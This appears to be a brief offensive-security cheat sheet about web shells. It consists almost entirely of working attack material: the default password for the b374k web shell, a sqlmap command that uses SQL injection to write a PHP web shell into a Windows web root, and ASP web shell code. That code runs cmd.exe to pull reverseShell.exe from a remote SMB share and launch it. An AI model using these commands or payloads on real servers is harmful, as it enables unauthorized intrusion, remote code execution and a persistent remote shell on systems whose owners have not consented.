These web shells helped tons. They might help you as well.

### [b374k webshell password]
```
b374k
```

### [Uploading Webshell using sqlmap]
```
sqlmap -r file_request --file-write=/root/pwn/http/winterwolfshell.php --file-dest=/inetpub/wwwroot/uploads/winterwolfshell.php --batch
```

### [asp based webshell]
```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C mkdir C:\test",0,True)
%>

<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C copy \\<ip>\share\reverseShell.exe C:\test\reverseShell.exe",0,True)
%>

<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C start C:\test\reverseShell.exe",0,True)
%>
```
